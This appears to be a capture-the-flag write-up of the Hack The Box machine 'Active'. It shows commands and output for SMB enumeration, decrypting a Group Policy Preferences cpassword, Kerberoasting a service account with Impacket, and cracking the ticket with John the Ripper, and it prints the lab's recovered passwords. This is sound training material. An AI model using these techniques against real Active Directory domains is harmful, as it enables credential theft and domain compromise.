---                                                                                                      
layout: offsec
category: [offsec]
---

![](/assets/images/active.png)

# Active 10.10.10.100

### Tools

+ enum4linux
+ smbclient
+ gpocrack
+ smbspider
+ Impacket


> __TL;DR__
>
> Pwing a KDC by taking foothold with the cPassword identifiers found in an old GPO. It was impossible to execute commands, so I created paquets to get an arcfour (RC4) TGS for the CIFS service account and cracked the password. That gave me access as Administrator on this KDC.. game over! 

#### Scanning

```bash
nmap -sC -sV -oA nmap/init 10.10.10.100
enum4linux -a 10.10.10.100
```
```
# Nmap 7.01 scan initiated Wed Sep 26 21:45:08 2018 as: nmap -sC -sV -oA nmap.init 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up (0.13s latency).
Not shown: 983 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Windows 2003 Kerberos (server time: 2018-09-27 01:45:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC 
139/tcp   open  netbios-ssn   Microsoft Windows 98 netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0 
636/tcp   open  tcpwrapped
3268/tcp  open  ldap
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC 
49153/tcp open  msrpc         Microsoft Windows RPC 
49154/tcp open  msrpc         Microsoft Windows RPC 
49155/tcp open  msrpc         Microsoft Windows RPC 
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0 
49158/tcp open  msrpc         Microsoft Windows RPC 
Service Info: OSs: Windows, Windows 98; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003, cpe:/o:microsoft:windows_98

Host script results:
|_smbv2-enabled: Server supports SMBv2 protocol

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 26 21:46:43 2018 -- 1 IP address (1 host up) scanned in 94.85 seconds
```
## Gainning Access

Enum4linux shows that Replication can be listed, so by browsing the directories you can easily find:

```xml
$ smbclient //10.10.10.100/Replication
smb: \> cd active.htb
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> get Registry.pol
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\> get Groups\Groups.xml
$ cat Groups\\Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
	<User 

		clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" 
		name="active.htb\SVC_TGS" image="2" 
		changed="2018-07-18 20:46:06" 
		uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">

		<Properties 

			action="U" 
			newName="" 
			fullName="" 
			description="" 
			cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" 
			changeLogon="0" 
			noChange="1" 
			neverExpires="1" 
			acctDisabled="0" 
			userName="active.htb\SVC_TGS"/>
	</User>
</Groups>
```

Note the [cPassword](https://pentestlab.blog/tag/cpassword/) in the XML file.


```bash
python gpocrack/gpocrack.py 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
Password is: GPPstillStandingStrong2k18
```

> Well, so far that's all I have! 

+ User: SVC_TGS
+ DOMAIN: active.htb
+ Password="GPPstillStandingStrong2k18"


```
smbclient //10.10.10.100/Users -U=SVC_TGS%GPPstillStandingStrong2k18 
smb: \SVC_TGS\Desktop\> get user.txt 
```


## PrivEsc:

> This box was not trivial. You cannot simply execute commands with CME. In addition, the new accesses on the SMB sharing with the identifiers found were a rabbit hole.

```
crackmapexec 10.10.10.100 -u SVC_TGS -p "GPPstillStandingStrong2k18" --shares  
CME          10.10.10.100:445 DC              [*] Windows 6.1 Build 7601 (name:DC) (domain:ACTIVE)
CME          10.10.10.100:445 DC              [+] ACTIVE\SVC_TGS:GPPstillStandingStrong2k18 
CME          10.10.10.100:445 DC              [+] Enumerating shares
CME          10.10.10.100:445 DC              SHARE           Permissions
CME          10.10.10.100:445 DC              -----           -----------
CME          10.10.10.100:445 DC              ADMIN$          NO ACCESS
CME          10.10.10.100:445 DC              IPC$            NO ACCESS
CME          10.10.10.100:445 DC              SYSVOL          READ
CME          10.10.10.100:445 DC              C$              NO ACCESS
CME          10.10.10.100:445 DC              Replication     READ
CME          10.10.10.100:445 DC              NETLOGON        READ
CME          10.10.10.100:445 DC              Users           READ
```

```py
smbspider.py -u SVC_TGS -p GPPstillStandingStrong2k18 -h 10.10.10.100 -s Users

 ********************************************************
 *     		        _     				*
 *    		       | |       //  \\			* 
 *	  ___ _ __ ___ | |__    _\\()//_		*
 *	 / __| '_ ` _ \| '_ \  / //  \\ \ 		*
 *	 \__ \ | | | | | |_) |   |\__/|			*
 *	 |___/_| |_| |_|_.__/				*
 *							*
 * SMB Spider v2.4, Alton Johnson (alton.jx@gmail.com) 	*
 ********************************************************

 [*] Spidering 1 system(s)...

 [*] Attempting to spider smb://10.10.10.100/Users 
 [*] \\10.10.10.100\Users\desktop.ini
 [*] \\10.10.10.100\Users\All Users\ATUS_STOPPED_ON_SYMLINK listing \All Users\
 [*] \\10.10.10.100\Users\Default\NTUSER.DAT
 [*] \\10.10.10.100\Users\Default\NTUSER.DAT.LOG
 [*] \\10.10.10.100\Users\Default\NTUSER.DAT.LOG1
 [*] \\10.10.10.100\Users\Default\NTUSER.DAT.LOG2
 [*] \\10.10.10.100\Users\Default\NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
 [*] \\10.10.10.100\Users\Default\NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
 [*] \\10.10.10.100\Users\Default\NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
 [*] \\10.10.10.100\Users\SVC_TGS\Desktop\user.txt
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\desktop.ini
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Server Manager.lnk
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Window Switcher.lnk
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\SendTo\Compressed (zipped) Folder.ZFSendToTarget
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\SendTo\Desktop (create shortcut).DeskLink
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\SendTo\Desktop.ini
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\SendTo\Mail Recipient.MAPIMail
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Command Prompt.lnk
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Desktop.ini
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Notepad.lnk
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Run.lnk
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Windows Explorer.lnk
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Maintenance\Desktop.ini
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Maintenance\Help.lnk
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Accessibility\Desktop.ini
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Accessibility\Ease of Access.lnk
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Accessibility\Magnify.lnk
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Accessibility\Narrator.lnk
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Accessibility\On-Screen Keyboard.lnk
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools\computer.lnk
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools\Control Panel.lnk
 [*] \\10.10.10.100\Users\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools\Desktop.ini
 [*] Finished with smb://10.10.10.100/Users. [Remaining: 0] 

-----
Completed in: 46.9s

```

> Ok, let's tease a bit that three heads bastard! ;) 

<img src="/assets/images/kerberos.jpg" style="height: 100%; width: auto">

Since I have found valid credentials for the SVC_TGS service, I can ask kerberos for more; Request a legitimate TGT and which service(s) this account can use. Although I can't execute commands as SVC_TGS with CME, I'm able to create packets with [impacket ](https://github.com/SecureAuthCorp/impacket) as if I were executing `ps> kinit` on the machine for example. This would give me the name(s) of the (SPNs)service principal name(s) to which the SVC_TGS account has access. 

Then, with an SPN and a TGT, I can create a TGS-REQ ans send it to Kerberos. The great thing about a TGS is that it allows you to crack the service's password offline. Yeah! ;) 

<img src="/assets/images/impacket_GetUserSPNs.png" style="height: 100%; width: auto">


Here we see that before requesting the TGS for a particular SPN, Impacket makes an (AS_REQ) Authentication Server Request and that the server responds with the TGT for this SVC_TGS service account. __Note that the krbtgt doesn't use the same encryption as the following TGS.__

<img src="/assets/images/AS_REQ.png" style="height: 100%; width: auto">

Then Impacket makes a TGS request that includes TGT information. Finally, the server responds with a TGS and Impacket format it in `krb5tgs` which is recognized by JTR and HC.

<img src="/assets/images/TGS_REQ.png" style="height: 100%; width: auto">

<img src="/assets/images/kdc.png" style="height: 100%; width: auto">

```xml
$krb5tgs$<ENCRYPTION_TYPE>$*<USERNAME>$<REALM>$<SPN>*$<FIRST_16_BYTES_TICKET>$<REMAINING_TICKET_BYTES>
```

<img src="/assets/images/krb5tgs.png" style="height: 100%; width: auto">


Now that we have a TGS, we can retrieve the Service's password. If you run Kali, you will need to follow these steps for JTR to recognize the format.

```
git clone https://github.com/magnumripper/JohnTheRipper.git && cd JohnTheRipper/src
./configure
make <foo> # <-- see the line of the configure ^
cd ../run
./john --test
```

And then, voilà :)

```
$ ./john /usr/share/wordlists/rockyou.txt tgs.txt # DON'T use --format=krb5tgs
```

```
./john --wordlist=rockyou.txt ~/documents/CTFs/OSCP/HTB/10.10.10.100/CIFS.krb5tgs
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:06 59.23% (ETA: 18:42:03) 0g/s 1421Kp/s 1421Kc/s 1421KC/s donmegaa..donisayangalia
Ticketmaster1968 (?)
1g 0:00:00:07 DONE (2018-10-20 18:42) 0.1342g/s 1414Kp/s 1414Kc/s 1414KC/s Tiffani143..Thrall
Use the "--show" option to display all of the cracked passwords reliably
Session completed

./john --wordlist=~/rockyou.txt ~/documents/CTFs/OSCP/HTB/10.10.10.100/CIFS.krb5tgs
$ ./git/tools/JohnTheRipper/run/john --show ./documents/CTFs/OSCP/HTB/10.10.10.100/CIFS.krb5tgs 
?:Ticketmaster1968

1 password hash cracked, 0 left
```

<img src="/assets/images/active_root.png" style="height: 100%; width: auto">
